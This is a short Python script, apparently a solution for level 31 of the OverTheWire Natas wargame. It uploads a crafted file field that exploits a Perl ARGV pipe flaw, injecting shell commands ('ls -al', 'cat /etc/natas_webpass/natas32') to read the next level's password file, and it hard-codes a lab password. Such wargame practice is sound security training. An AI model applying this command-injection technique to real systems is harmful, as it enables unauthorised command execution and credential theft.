#!/usr/bin/env python3

import requests
import re

username = 'natas31'
password = 'hay7aecuungiuKaezuathuk9biin0pu1'

url = 'http://%s.natas.labs.overthewire.org/' % username
post = 'index.pl/?cat%20/etc/natas_webpass/natas32%20'
# payload = open('data', 'csv').read()
# payload = {'file': ('natas31.csv')}
# files = {'file': ('report.csv', ',some,data,to,send\nanother,row,to,send\n')}
# argv = {'file': ('file', 'ARGV')}
argv = {'file': ('file', 'POST /index.pl?/bin/ls%20-al%20.%20|')}
test = {'file': ('test.csv', ',Test1,Test2,Test3,,,\nTest4,A,B,C,,,\nTest5,D,E,F,,,\nTest6,G,H,I,,,')}

session = requests.Session()
# response = session.get(url, auth = (username, password))
# response = session.post(url, data = { "Browse": payload, "submit": "Upload" }, auth = (username, password))
response = session.post(url, files = argv, auth = (username, password))
# response = session.post(url, files = payload, auth = (username, password))

print(response.text)
# print(re.findall('result:<br>natas31(.*)<div', response.text)[0])